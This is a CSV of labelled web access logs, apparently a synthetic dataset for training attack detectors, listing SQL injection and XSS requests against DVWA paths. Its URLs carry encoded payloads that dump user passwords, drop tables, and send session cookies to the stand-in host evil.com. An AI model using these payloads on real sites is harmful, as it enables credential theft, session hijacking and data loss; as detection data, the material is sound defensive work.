timestamp,ip,method,url,status,size,user_agent,label,attack_type
2026-07-04T18:28:27.575428,192.168.1.159,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20user%2Cpassword%20FROM%20users--%20&Submit=Submit,403,1675,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0,Attack,SQL Injection
2026-07-04T18:28:30.575428,10.0.0.44,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20OR%20%271%27%3D%271%27%20--%20&Submit=Submit,200,741,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,Attack,SQL Injection
2026-07-04T18:28:33.575428,192.168.1.156,GET,/dvwa/vulnerabilities/sqli/?id=1%27%3B%20DROP%20TABLE%20users--%20&Submit=Submit,403,1452,curl/8.1.2,Attack,SQL Injection
2026-07-04T18:28:40.575428,192.168.1.157,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20user%2Cpassword%20FROM%20users--%20&Submit=Submit,200,1354,sqlmap/1.7.2#stable (http://sqlmap.org),Attack,SQL Injection
2026-07-04T18:28:43.575428,192.168.1.160,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20OR%20%271%27%3D%271&Submit=Submit,403,667,curl/8.1.2,Attack,SQL Injection
2026-07-04T18:28:51.575428,192.168.1.156,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20database%28%29%2Cversion%28%29--%20&Submit=Submit,200,415,Hydra/9.4,Attack,SQL Injection
2026-07-04T18:28:54.575428,10.0.0.44,GET,/dvwa/vulnerabilities/sqli/?id=%27%20OR%201%3D1%23&Submit=Submit,200,2275,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,Attack,SQL Injection
2026-07-04T18:29:02.575428,192.168.1.155,GET,/dvwa/vulnerabilities/sqli/?id=%27%20OR%201%3D1%23&Submit=Submit,200,2994,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/121.0 Safari/537.36,Attack,SQL Injection
2026-07-04T18:29:10.575428,10.0.0.13,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20AND%20SLEEP%285%29--%20&Submit=Submit,200,1792,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0,Attack,SQL Injection
2026-07-04T18:29:11.575428,192.168.1.156,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20user%2Cpassword%20FROM%20users--%20&Submit=Submit,200,1110,curl/8.1.2,Attack,SQL Injection
2026-07-04T18:29:18.575428,192.168.1.156,GET,/dvwa/vulnerabilities/sqli/?id=1%27%3B%20DROP%20TABLE%20users--%20&Submit=Submit,200,2490,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36,Attack,SQL Injection
2026-07-04T18:29:21.575428,192.168.1.161,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20OR%20%271%27%3D%271%27%20--%20&Submit=Submit,500,494,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36,Attack,SQL Injection
2026-07-04T18:29:26.575428,192.168.1.164,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20user%2Cpassword%20FROM%20users--%20&Submit=Submit,200,318,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/121.0 Safari/537.36,Attack,SQL Injection
2026-07-04T18:29:34.575428,10.0.0.44,GET,/dvwa/vulnerabilities/sqli/?id=1%27%3B%20DROP%20TABLE%20users--%20&Submit=Submit,200,2065,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/121.0 Safari/537.36,Attack,SQL Injection
2026-07-04T18:29:41.575428,192.168.1.163,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20database%28%29%2Cversion%28%29--%20&Submit=Submit,403,1268,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/121.0 Safari/537.36,Attack,SQL Injection
2026-07-04T18:29:48.575428,192.168.1.150,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20database%28%29%2Cversion%28%29--%20&Submit=Submit,500,1237,python-requests/2.31.0,Attack,SQL Injection
2026-07-04T18:29:50.575428,192.168.1.161,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20AND%20SLEEP%285%29--%20&Submit=Submit,200,2250,Hydra/9.4,Attack,SQL Injection
2026-07-04T18:29:52.575428,192.168.1.158,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20OR%20%271%27%3D%271%27%20--%20&Submit=Submit,200,442,curl/8.1.2,Attack,SQL Injection
2026-07-04T18:29:58.575428,192.168.1.151,GET,/dvwa/vulnerabilities/sqli/?id=%27%20OR%201%3D1%23&Submit=Submit,500,2915,curl/8.1.2,Attack,SQL Injection
2026-07-04T18:30:04.575428,192.168.1.158,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20AND%20SLEEP%285%29--%20&Submit=Submit,500,2624,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36,Attack,SQL Injection
2026-07-04T18:30:07.575428,172.16.5.9,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20OR%20%271%27%3D%271&Submit=Submit,403,1304,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36,Attack,SQL Injection
2026-07-04T18:30:13.575428,192.168.1.162,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20OR%20%271%27%3D%271&Submit=Submit,200,2829,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,Attack,SQL Injection
2026-07-04T18:30:16.575428,192.168.1.162,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20user%2Cpassword%20FROM%20users--%20&Submit=Submit,500,2093,curl/8.1.2,Attack,SQL Injection
2026-07-04T18:30:20.575428,10.0.0.44,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20database%28%29%2Cversion%28%29--%20&Submit=Submit,403,501,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0,Attack,SQL Injection
2026-07-04T18:30:26.575428,192.168.1.156,GET,/dvwa/vulnerabilities/sqli/?id=1%27%3B%20DROP%20TABLE%20users--%20&Submit=Submit,500,1946,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,Attack,SQL Injection
2026-07-04T18:30:34.575428,172.16.5.9,GET,/dvwa/vulnerabilities/sqli/?id=%27%20OR%201%3D1%23&Submit=Submit,500,2515,sqlmap/1.7.2#stable (http://sqlmap.org),Attack,SQL Injection
2026-07-04T18:30:37.575428,192.168.1.159,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20database%28%29%2Cversion%28%29--%20&Submit=Submit,403,1541,sqlmap/1.7.2#stable (http://sqlmap.org),Attack,SQL Injection
2026-07-04T18:30:41.575428,192.168.1.163,GET,/dvwa/vulnerabilities/sqli/?id=1%27%3B%20DROP%20TABLE%20users--%20&Submit=Submit,200,1377,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,Attack,SQL Injection
2026-07-04T18:30:47.575428,192.168.1.150,GET,/dvwa/vulnerabilities/sqli/?id=1%20UNION%20SELECT%20null%2Cnull--%20&Submit=Submit,500,1502,sqlmap/1.7.2#stable (http://sqlmap.org),Attack,SQL Injection
2026-07-04T18:30:54.575428,192.168.1.162,GET,/dvwa/vulnerabilities/sqli/?id=1%27%3B%20DROP%20TABLE%20users--%20&Submit=Submit,200,2339,curl/8.1.2,Attack,SQL Injection
2026-07-04T18:31:01.575428,192.168.1.156,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20OR%20%271%27%3D%271%27%20--%20&Submit=Submit,403,2482,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0,Attack,SQL Injection
2026-07-04T18:31:09.575428,192.168.1.159,GET,/dvwa/vulnerabilities/sqli/?id=1%20UNION%20SELECT%20null%2Cnull--%20&Submit=Submit,200,2914,Hydra/9.4,Attack,SQL Injection
2026-07-04T18:31:12.575428,192.168.1.151,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20OR%20%271%27%3D%271&Submit=Submit,500,965,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0,Attack,SQL Injection
2026-07-04T18:31:14.575428,192.168.1.162,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20user%2Cpassword%20FROM%20users--%20&Submit=Submit,500,1342,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36,Attack,SQL Injection
2026-07-04T18:31:16.575428,192.168.1.164,GET,/dvwa/vulnerabilities/sqli/?id=%27%20OR%201%3D1%23&Submit=Submit,200,195,sqlmap/1.7.2#stable (http://sqlmap.org),Attack,SQL Injection
2026-07-04T18:31:19.575428,192.168.1.160,GET,/dvwa/vulnerabilities/sqli/?id=1%27%3B%20DROP%20TABLE%20users--%20&Submit=Submit,500,603,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,Attack,SQL Injection
2026-07-04T18:31:22.575428,172.16.5.9,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20database%28%29%2Cversion%28%29--%20&Submit=Submit,200,1743,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,Attack,SQL Injection
2026-07-04T18:31:26.575428,192.168.1.154,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20AND%20SLEEP%285%29--%20&Submit=Submit,200,2872,curl/8.1.2,Attack,SQL Injection
2026-07-04T18:31:34.575428,192.168.1.155,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20user%2Cpassword%20FROM%20users--%20&Submit=Submit,200,2955,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36,Attack,SQL Injection
2026-07-04T18:31:42.575428,192.168.1.158,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20OR%20%271%27%3D%271&Submit=Submit,500,1975,curl/8.1.2,Attack,SQL Injection
2026-07-04T18:31:44.575428,192.168.1.162,GET,/dvwa/vulnerabilities/sqli/?id=%27%20OR%201%3D1%23&Submit=Submit,200,2160,curl/8.1.2,Attack,SQL Injection
2026-07-04T18:31:52.575428,192.168.1.164,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20OR%20%271%27%3D%271%27%20--%20&Submit=Submit,403,2797,sqlmap/1.7.2#stable (http://sqlmap.org),Attack,SQL Injection
2026-07-04T18:32:00.575428,192.168.1.161,GET,/dvwa/vulnerabilities/sqli/?id=1%27%3B%20DROP%20TABLE%20users--%20&Submit=Submit,200,867,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36,Attack,SQL Injection
2026-07-04T18:32:07.575428,192.168.1.157,GET,/dvwa/vulnerabilities/sqli/?id=1%27%3B%20DROP%20TABLE%20users--%20&Submit=Submit,200,1725,python-requests/2.31.0,Attack,SQL Injection
2026-07-04T18:32:10.575428,192.168.1.153,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20OR%20%271%27%3D%271&Submit=Submit,500,796,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,Attack,SQL Injection
2026-07-04T18:32:15.575428,172.16.5.9,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20OR%20%271%27%3D%271%27%20--%20&Submit=Submit,500,2171,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36,Attack,SQL Injection
2026-07-04T18:32:22.575428,172.16.5.9,GET,/dvwa/vulnerabilities/sqli/?id=%27%20OR%201%3D1%23&Submit=Submit,200,580,Hydra/9.4,Attack,SQL Injection
2026-07-04T18:32:28.575428,192.168.1.163,GET,/dvwa/vulnerabilities/sqli/?id=1%20UNION%20SELECT%20null%2Cnull--%20&Submit=Submit,403,999,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0,Attack,SQL Injection
2026-07-04T18:32:29.575428,192.168.1.164,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20OR%20%271%27%3D%271%27%20--%20&Submit=Submit,200,1711,sqlmap/1.7.2#stable (http://sqlmap.org),Attack,SQL Injection
2026-07-04T18:32:35.575428,192.168.1.162,GET,/dvwa/vulnerabilities/sqli/?id=1%27%3B%20DROP%20TABLE%20users--%20&Submit=Submit,200,193,curl/8.1.2,Attack,SQL Injection
2026-07-04T18:32:40.575428,192.168.1.153,GET,/dvwa/vulnerabilities/sqli/?id=%27%20OR%201%3D1%23&Submit=Submit,200,2135,python-requests/2.31.0,Attack,SQL Injection
2026-07-04T18:32:48.575428,192.168.1.152,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cbody%20onload%3Dalert%28%27xss%27%29%3E,200,724,Hydra/9.4,Attack,XSS
2026-07-04T18:32:56.575428,192.168.1.158,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27xss%27%29%3E,200,561,python-requests/2.31.0,Attack,XSS
2026-07-04T18:32:59.575428,192.168.1.159,GET,/dvwa/vulnerabilities/xss_s/?name=%3Cbody%20onload%3Dalert%28%27xss%27%29%3E,500,467,Hydra/9.4,Attack,XSS
2026-07-04T18:33:00.575428,192.168.1.158,GET,/dvwa/vulnerabilities/xss_s/?name=%3Cscript%3Edocument.location='http://evil.com/'%2Bdocument.cookie%3C%2Fscript%3E,500,1037,python-requests/2.31.0,Attack,XSS
2026-07-04T18:33:01.575428,172.16.5.9,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Edocument.location='http://evil.com/'%2Bdocument.cookie%3C%2Fscript%3E,200,2775,curl/8.1.2,Attack,XSS
2026-07-04T18:33:03.575428,192.168.1.162,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Edocument.location='http://evil.com/'%2Bdocument.cookie%3C%2Fscript%3E,200,169,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36,Attack,XSS
2026-07-04T18:33:04.575428,192.168.1.162,GET,/dvwa/vulnerabilities/xss_s/?name=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27xss%27%29%3E,500,969,curl/8.1.2,Attack,XSS
2026-07-04T18:33:06.575428,192.168.1.150,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,403,937,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,Attack,XSS
2026-07-04T18:33:08.575428,192.168.1.157,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%2Fsteal%3Fc%3D%27%2Bdocument.cookie%29%3C%2Fscript%3E,500,330,Hydra/9.4,Attack,XSS
2026-07-04T18:33:15.575428,10.0.0.44,GET,/dvwa/vulnerabilities/xss_s/?name=%3Csvg%20onload%3Dalert%281%29%3E,200,2717,Hydra/9.4,Attack,XSS
2026-07-04T18:33:19.575428,192.168.1.156,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Edocument.location='http://evil.com/'%2Bdocument.cookie%3C%2Fscript%3E,500,1025,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,Attack,XSS
2026-07-04T18:33:21.575428,192.168.1.161,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27xss%27%29%3E,200,2828,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/121.0 Safari/537.36,Attack,XSS
2026-07-04T18:33:27.575428,192.168.1.150,GET,/dvwa/vulnerabilities/xss_s/?name=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27xss%27%29%3E,500,420,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,Attack,XSS
2026-07-04T18:33:32.575428,192.168.1.161,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,200,1385,sqlmap/1.7.2#stable (http://sqlmap.org),Attack,XSS
2026-07-04T18:33:40.575428,192.168.1.153,GET,/dvwa/vulnerabilities/xss_r/?name=%3Csvg%20onload%3Dalert%281%29%3E,200,1478,python-requests/2.31.0,Attack,XSS
2026-07-04T18:33:47.575428,192.168.1.154,GET,/dvwa/vulnerabilities/xss_s/?name=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27xss%27%29%3E,200,426,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/121.0 Safari/537.36,Attack,XSS
2026-07-04T18:33:53.575428,192.168.1.150,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Edocument.location='http://evil.com/'%2Bdocument.cookie%3C%2Fscript%3E,200,2556,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0,Attack,XSS
2026-07-04T18:33:54.575428,192.168.1.157,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cbody%20onload%3Dalert%28%27xss%27%29%3E,403,1118,sqlmap/1.7.2#stable (http://sqlmap.org),Attack,XSS
2026-07-04T18:34:01.575428,192.168.1.157,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,403,2192,Hydra/9.4,Attack,XSS
2026-07-04T18:34:06.575428,192.168.1.156,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Edocument.location='http://evil.com/'%2Bdocument.cookie%3C%2Fscript%3E,200,1125,python-requests/2.31.0,Attack,XSS
2026-07-04T18:34:14.575428,192.168.1.160,GET,/dvwa/vulnerabilities/xss_s/?name=%3Csvg%20onload%3Dalert%281%29%3E,200,2283,python-requests/2.31.0,Attack,XSS
2026-07-04T18:34:21.575428,192.168.1.159,GET,/dvwa/vulnerabilities/xss_s/?name=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27xss%27%29%3E,403,1142,sqlmap/1.7.2#stable (http://sqlmap.org),Attack,XSS
2026-07-04T18:34:25.575428,172.16.5.9,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%2Fsteal%3Fc%3D%27%2Bdocument.cookie%29%3C%2Fscript%3E,500,2640,sqlmap/1.7.2#stable (http://sqlmap.org),Attack,XSS
2026-07-04T18:34:32.575428,10.0.0.44,GET,/dvwa/vulnerabilities/xss_s/?name=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27xss%27%29%3E,200,414,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/121.0 Safari/537.36,Attack,XSS
2026-07-04T18:34:40.575428,192.168.1.152,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,500,664,curl/8.1.2,Attack,XSS
2026-07-04T18:34:42.575428,192.168.1.155,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27xss%27%29%3E,200,2063,curl/8.1.2,Attack,XSS
2026-07-04T18:34:47.575428,192.168.1.155,GET,/dvwa/vulnerabilities/xss_s/?name=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27xss%27%29%3E,500,2631,curl/8.1.2,Attack,XSS
2026-07-04T18:34:51.575428,192.168.1.159,GET,/dvwa/vulnerabilities/xss_s/?name=%3Cbody%20onload%3Dalert%28%27xss%27%29%3E,500,1263,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36,Attack,XSS
2026-07-04T18:34:59.575428,192.168.1.152,GET,/dvwa/vulnerabilities/xss_s/?name=%3Cscript%3Edocument.location='http://evil.com/'%2Bdocument.cookie%3C%2Fscript%3E,500,2078,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/121.0 Safari/537.36,Attack,XSS
2026-07-04T18:35:07.575428,192.168.1.163,GET,/dvwa/vulnerabilities/xss_s/?name=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27xss%27%29%3E,200,1712,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,Attack,XSS
2026-07-04T18:35:14.575428,192.168.1.152,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cbody%20onload%3Dalert%28%27xss%27%29%3E,200,869,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36,Attack,XSS
2026-07-04T18:35:19.575428,192.168.1.162,GET,/dvwa/vulnerabilities/xss_s/?name=%3Csvg%20onload%3Dalert%281%29%3E,403,1686,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0,Attack,XSS
2026-07-04T18:35:27.575428,192.168.1.152,GET,/dvwa/vulnerabilities/xss_s/?name=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27xss%27%29%3E,500,783,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/121.0 Safari/537.36,Attack,XSS
2026-07-04T18:35:31.575428,192.168.1.150,GET,/dvwa/vulnerabilities/xss_s/?name=%3Cbody%20onload%3Dalert%28%27xss%27%29%3E,200,1807,sqlmap/1.7.2#stable (http://sqlmap.org),Attack,XSS
2026-07-04T18:35:38.575428,192.168.1.162,GET,/dvwa/vulnerabilities/xss_s/?name=%3Cscript%3Edocument.location='http://evil.com/'%2Bdocument.cookie%3C%2Fscript%3E,403,2775,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/121.0 Safari/537.36,Attack,XSS
2026-07-04T18:35:40.575428,192.168.1.163,GET,/dvwa/vulnerabilities/xss_s/?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,200,815,sqlmap/1.7.2#stable (http://sqlmap.org),Attack,XSS
2026-07-04T18:35:44.575428,192.168.1.163,GET,/dvwa/vulnerabilities/xss_s/?name=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%2Fsteal%3Fc%3D%27%2Bdocument.cookie%29%3C%2Fscript%3E,200,2151,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36,Attack,XSS
2026-07-04T18:35:50.575428,192.168.1.151,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Edocument.location='http://evil.com/'%2Bdocument.cookie%3C%2Fscript%3E,500,2106,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,Attack,XSS
2026-07-04T18:35:51.575428,192.168.1.161,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%2Fsteal%3Fc%3D%27%2Bdocument.cookie%29%3C%2Fscript%3E,403,2629,sqlmap/1.7.2#stable (http://sqlmap.org),Attack,XSS
2026-07-04T18:35:59.575428,192.168.1.154,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27xss%27%29%3E,200,628,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36,Attack,XSS
2026-07-04T18:36:01.575428,192.168.1.162,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%2Fsteal%3Fc%3D%27%2Bdocument.cookie%29%3C%2Fscript%3E,200,923,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,Attack,XSS
2026-07-04T18:36:08.575428,192.168.1.155,GET,/dvwa/vulnerabilities/xss_s/?name=%3Csvg%20onload%3Dalert%281%29%3E,200,2333,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,Attack,XSS
2026-07-04T18:36:15.575428,192.168.1.159,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%2Fsteal%3Fc%3D%27%2Bdocument.cookie%29%3C%2Fscript%3E,200,2755,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,Attack,XSS
2026-07-04T18:36:21.575428,192.168.1.154,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%2Fsteal%3Fc%3D%27%2Bdocument.cookie%29%3C%2Fscript%3E,200,1411,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36,Attack,XSS
2026-07-04T18:36:22.575428,192.168.1.155,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,200,1861,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0,Attack,XSS
2026-07-04T18:36:29.575428,192.168.1.159,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27xss%27%29%3E,403,913,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,Attack,XSS
2026-07-04T18:36:32.575428,192.168.1.156,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27xss%27%29%3E,200,2472,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0,Attack,XSS
2026-07-04T18:36:36.575428,192.168.1.155,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,500,1212,curl/8.1.2,Attack,XSS
2026-07-04T18:36:43.575428,192.168.1.164,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%2Fsteal%3Fc%3D%27%2Bdocument.cookie%29%3C%2Fscript%3E,200,1350,Hydra/9.4,Attack,XSS
2026-07-04T18:36:45.575428,192.168.1.162,GET,/dvwa/vulnerabilities/xss_r/?name=%3Csvg%20onload%3Dalert%281%29%3E,403,271,Hydra/9.4,Attack,XSS
2026-07-04T18:36:49.575428,10.0.0.13,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%2Fsteal%3Fc%3D%27%2Bdocument.cookie%29%3C%2Fscript%3E,200,400,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0,Attack,XSS
2026-07-04T18:36:54.575428,192.168.1.150,GET,/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,200,179,sqlmap/1.7.2#stable (http://sqlmap.org),Attack,XSS
